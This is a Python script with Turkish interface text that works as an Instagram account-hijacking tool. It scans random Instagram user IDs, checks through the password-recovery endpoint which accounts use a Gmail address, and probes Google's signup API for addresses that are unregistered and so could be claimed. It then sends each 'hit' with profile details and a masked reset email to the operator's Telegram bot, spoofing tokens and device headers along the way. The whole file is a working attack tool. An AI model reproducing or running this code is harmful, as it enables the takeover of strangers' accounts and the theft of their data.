import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread
import requests
from requests import post as rpost
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render
from colorama import Fore, Style, init
from rich.console import Console
from rich.panel import Panel
from rich.live import Live
import urllib.parse
init(autoreset=True)
console = Console()
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
M = Fore.MAGENTA
RESET = Style.RESET_ALL
CONFIG = {
    "insta_recovery": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
    "insta_graphql": "https://www.instagram.com/api/graphql",
    "google_url": "https://accounts.google.com",
    "cookie": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
    "form_type": "application/x-www-form-urlencoded; charset=UTF-8",
    "default_ua": (
        "Instagram 100.0.0.17.129 Android (29/10; 420dpi; "
        "1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)"
    ),
    "token_file": "token.txt",
    "output_file": "BUĞRA&ATES_İNSTA_hits.txt",
    "domain": "@gmail.com",
    "id_ranges": [
        (100000, 1278889, 2010),
        (1279000, 17750000, 2011),
        (17750001, 279760000, 2012),
        (279760001, 900990000, 2013),
        (900990001, 1629010000, 2014),
        (1629010001, 2369359761, 2015),
        (2369359762, 4239516754, 2016),
        (4239516755, 6345108209, 2017),
        (6345108210, 10016232395, 2018),
        (10016232396, 27238602159, 2019),
        (27238602160, 43464475395, 2020),
        (43464475396, 50289297647, 2021),
        (50289297648, 57464707082, 2022),
        (57464707083, 63313426938, 2023),
        (63313426938, 79273372931, 2024),
        (79273372931, 90273372931, 2025)
    ]
}
hits = 0
bad_insta = 0
bad_email = 0
good_insta = 0
total = 0
info_cache = {}
min_followers = 0
cinstagram_session = requests.Session()
def ustats():
    with Live(console=console, refresh_per_second=4) as live:
        while True:
            panel = Panel(
                f"[green]Hits: {hits}[/green]\n"
                f"[red]Bad Insta: {bad_insta}[/red]\n"
                f"[yellow]Bad Email: {bad_email}[/yellow]\n"
                f"[cyan]Good Insta: {good_insta}[/cyan]\n"
                f"[magenta]Min Followers: {min_followers}[/magenta]",
                title="BUĞRA & ATEŞ İNSTA",
                border_style="cyan"
            )
            live.update(panel)
            time.sleep(0.30)
def gtokens():
    max_retries = 3
    endpoint = "/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
    for attempt in range(max_retries):
        try:
            alphabet = 'abcdefghijklmnopqrstuvwxyz'
            n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
            n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
            host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en-GB,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'user-agent': generate_user_agent()
            }
            res1 = requests.get(
                f"{CONFIG['google_url']}{endpoint}",
                headers=headers
            )
            if res1.status_code != 200:
                continue
            tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
            if not tok:
                with open("debug_response.html", "w", encoding="utf-8") as f:
                    f.write(res1.text)
                time.sleep(0.5)
                continue
            tl = tok.group(2)
            cookies = {'__Host-GAPS': host}
            headers.update({
                'authority': 'accounts.google.com',
                'origin': CONFIG["google_url"],
                'referer': f"{CONFIG['google_url']}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
                'user-agent': generate_user_agent()
            })
            data = {
                'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': (
                    '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                    'null,0,1,"",null,null,2,2]'
                )
            }
            response = requests.post(
                f"{CONFIG['google_url']}/_/signup/validatepersonaldetails",
                cookies=cookies,
                headers=headers,
                data=data
            )
            try:
                tl_new = str(response.text).split('",null,"')[1].split('"')[0]
                if not tl_new:
                    time.sleep(0.5)
                    continue
                tl = tl_new
            except IndexError:
                with open("debug_response.html", "w", encoding="utf-8") as f:
                    f.write(response.text)
                time.sleep(0.5)
                continue
            host = response.cookies.get_dict().get('__Host-GAPS', host)
            with open(CONFIG["token_file"], 'w') as f:
                f.write(f"{tl}//{host}\n")
            return
        except Exception as e:
            time.sleep(0.5)
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': generate_user_agent(),
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-same-domain': '1'
        }
        params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'hl': 'en'
        }
        email = ''.join(choice('abcdefghijklmnopqrstuvwxyz1234567890.') for _ in range(randrange(16, 26)))
        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
        response = requests.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data
        )
        tl = re.search(r'"TL:([^"]+)"', response.text)
        if tl:
            tl = tl.group(1)
            host = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for _ in range(randrange(15, 30)))
            with open(CONFIG["token_file"], 'w') as f:
                f.write(f"{tl}//{host}\n")
            return
        else:
            pass
    except Exception as e:
        pass
    sys.exit(1)
def cgmail(email, token, chat_id):
    global bad_email
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(CONFIG["token_file"], 'r') as f:
            tl, host = f.read().splitlines()[0].split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': CONFIG["form_type"],
            'google-accounts-xsrf': '1',
            'origin': CONFIG["google_url"],
            'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            'user-agent': generate_user_agent()
        }
        params = {'TL': tl}
        data = (
            f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
            f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
            "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
            "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
            "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
            "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
        )
        resp = rpost(
            f"{CONFIG['google_url']}/_/signup/usernameavailability",
            params=params, cookies=cookies, headers=headers, data=data
        )
        if '"gf.uar",1' in resp.text:
            username = email
            domain = "gmail.com"
            iaccount(username, domain, token, chat_id)
        else:
            bad_email += 1
    except Exception as e:
        bad_email += 1
def cinstagram(email, token, chat_id):
    global good_insta, bad_insta, cinstagram_session
    ua = CONFIG["default_ua"]
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    csrf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    headers = {
        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': (
            'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0'
        ),
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'user-agent': ua,
        'accept-language': 'en-GB, en-US',
        'cookie': f'csrftoken={csrf_token}; {CONFIG["cookie"]}',
        'content-type': CONFIG["form_type"],
        'accept-encoding': 'gzip, deflate',
        'host': 'i.instagram.com',
        'x-fb-http-engine': 'Liger',
        'connection': 'keep-alive'
    }
    data = {
        'signed_body': (
            '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
            json.dumps({
                '_csrftoken': csrf_token,
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            })
        ),
        'ig_sig_key_version': '4'
    }
    try:
        resp = cinstagram_session.post(CONFIG["insta_recovery"], headers=headers, data=data, timeout=5).text
        if email in resp:
            good_insta += 1
            cgmail(email, token, chat_id)
        else:
            bad_insta += 1
    except Exception:
        bad_insta += 1
def rreset(user):
    try:
        csrf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': (
                'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0'
            ),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'user-agent': CONFIG["default_ua"],
            'accept-language': 'en-GB, en-US',
            'cookie': f'csrftoken={csrf_token}; {CONFIG["cookie"]}',
            'content-type': CONFIG["form_type"],
            'accept-encoding': 'gzip, deflate',
            'host': 'i.instagram.com',
            'x-fb-http-engine': 'Liger',
            'connection': 'keep-alive'
        }
        data = {
            'signed_body': (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                json.dumps({
                    '_csrftoken': csrf_token,
                    'adid': str(uuid.uuid4()),
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16],
                    'query': user
                })
            ),
            'ig_sig_key_version': '4'
        }
        resp = requests.post(CONFIG["insta_recovery"], headers=headers, data=data, timeout=5).json()
        return resp.get('email', 'Bilinmiyor')
    except Exception:
        return 'Bilinmiyor'
def gdate(user_id):
    try:
        user_id = int(user_id)
        for lower, upper, year in CONFIG["id_ranges"]:
            if lower <= user_id <= upper:
                return year
        return 2023
    except Exception:
        return 2023
def iaccount(username, domain, token, chat_id):
    global total, hits
    info = info_cache.get(username, {})
    user_id = info.get('pk', 'Bilinmiyor')
    full_name = info.get('full_name', 'Bilinmiyor')
    followers = info.get('follower_count', 0)
    following = info.get('following_count', 0)
    posts = info.get('media_count', 0)
    is_private = info.get('is_private', False)
    bio = info.get('biography', 'Yok')
    is_verified = info.get('is_verified', False)
    is_business = info.get('is_business_account', False)  
    if followers < min_followers:
        return
    hits += 1
    total += 1
    meta_score = 0
    if is_verified:
        meta_score = 100
    else:
        if bio and bio != 'Yok' and bio.strip():
            meta_score += 30
        if posts >= 2:
            meta_score += 20
        elif posts == 0:
            meta_score += 10
        if followers >= 1:
            meta_score += 30
        elif followers == 0:
            meta_score += 10
        if is_business:
            meta_score += 20
        meta_score = min(meta_score, 100)
    output = (
        f"Yeni Hit! #{total}\n"
        f"Kullanıcı: @{username}\n"
        f"Email: {username}@{domain}\n"
        f"Reset: {rreset(username)}\n"
        f"Takipçi: {followers}\n"
        f"Takip: {following}\n"
        f"Gönderi: {posts}\n"
        f"Özel: {is_private}\n"
        f"Bio: {bio}\n"
        f"Doğrulanmış: {is_verified}\n"
        f"İş Hesabı: {is_business}\n"
        f"Tarih: {gdate(user_id)}\n"
        f"Meta: %{meta_score}\n" 
        f"URL: https://www.instagram.com/{username}\n"
        f"By : @konusurlar & @AtesOrj "
    )
    with open(CONFIG["output_file"], 'a', encoding='utf-8') as f:
        f.write(output + "\n")
    try:
        encoded_output = urllib.parse.quote(output)
        url = (
            f"https://api.telegram.org/bot{token}/sendMessage?"
            f"chat_id={chat_id}&text={encoded_output}"
        )
        if len(encoded_output) > 4096:
            pass
        resp = requests.get(url, timeout=10)
        if resp.status_code != 200:
            pass
    except Exception as e:
        pass
def get_follower_filter():
    global min_followers
    try:
        follower_input = input(f"{G}Takipçi : {C}")
        if follower_input.strip():
            min_followers = int(follower_input)
        else:
            min_followers = 0
    except ValueError:
        min_followers = 0
def get_date_range():
    date_input = input(f"{G}Tarih (enter = otomatik seçim): {C}").strip()
    if not date_input:
        return 1279000, 43464475395
    try:
        if '-' in date_input:
            start_year, end_year = map(int, date_input.split('-'))
        else:
            start_year = end_year = int(date_input)
        min_id, max_id = None, None
        for lower, upper, year in CONFIG["id_ranges"]:
            if year == start_year:
                min_id = lower
            if year == end_year:
                max_id = upper
        if min_id is None or max_id is None:
            return 1279000, 43464475395
        return min_id, max_id
    except ValueError:
        return 1279000, 43464475395
def sinsta(min_id, max_id):
    session = requests.Session()
    headers = {
        'X-FB-LSD': '',
        'user-agent': generate_user_agent(),
        'content-type': CONFIG["form_type"],
        'accept-encoding': 'gzip, deflate',
        'connection': 'keep-alive'
    }
    query_count = 0
    while True:
        try:
            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            headers['X-FB-LSD'] = lsd
            user_id = random.randrange(min_id, max_id)
            csrf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            cookies = {
                'csrftoken': csrf_token,
                'datr': ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            }
            data = {
                'lsd': lsd,
                'variables': json.dumps({
                    'id': int(user_id),
                    'render_surface': 'PROFILE'
                }, separators=(',', ':')),
                'doc_id': '25618261841150840'
            }
            resp = session.post(CONFIG["insta_graphql"], headers=headers, data=data, cookies=cookies, timeout=5)
            query_count += 1
            resp.raise_for_status()
            user = resp.json().get('data', {}).get('user', {})
            username = user.get('username')
            if username:
                info_cache[username] = user
                email = username + CONFIG["domain"]
                cinstagram(email, TOKEN, CHAT_ID)
            if query_count % 10 == 0:
                time.sleep(0.1)  
            if query_count >= 100:  
                session.close()
                session = requests.Session()
                query_count = 0
        except (requests.RequestException, ValueError):
            time.sleep(0.1)
            continue
        except Exception:
            time.sleep(0.1)
            continue
def main():
    global TOKEN, CHAT_ID
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
░░░░░░░░████████████████░░░░░░░░
░░░░░██████████████████████░░░░░
░░░███░░░░░░░░░░░░░░░░░░░░███░░░
░░░██░░░░░░░░░░░░░░░░░███░░██░░░
░░███░░░░░░░████████░░░░░░░███░░
░░███░░░░░███░░░░░░███░░░░░███░░
░░███░░░░███░░░░░░░░███░░░░███░░
░░███░░░░██░░░░░░░░░░██░░░░███░░
░░███░░░░███░░░░░░░░███░░░░███░░
░░███░░░░░███░░░░░░███░░░░░███░░
░░███░░░░░░░████████░░░░░░░███░░
░░░██░░░░░░░░░░░░░░░░░░░░░░██░░░
░░░███░░░░░░░░░░░░░░░░░░░░███░░░
░░░░░██████████████████████░░░░░
░░░░░░░░████████████████░░░░░░░░
""")

        print("========================İNSTA TOOL========================")
        CHAT_ID = int(input(f"{G}Telegram ID: {C}"))
    except ValueError:
        console.print(f"{R}Geçersiz ID!")
        sys.exit(1)
    TOKEN = input(f"{G}Telegram Token: {C}")
    get_follower_filter()
    min_id, max_id = get_date_range()
    os.system('cls' if os.name == 'nt' else 'clear')
    gtokens()
    Thread(target=ustats, daemon=True).start()
    for _ in range(50):  
        Thread(target=sinsta, args=(min_id, max_id)).start()
if __name__ == "__main__":
    main()
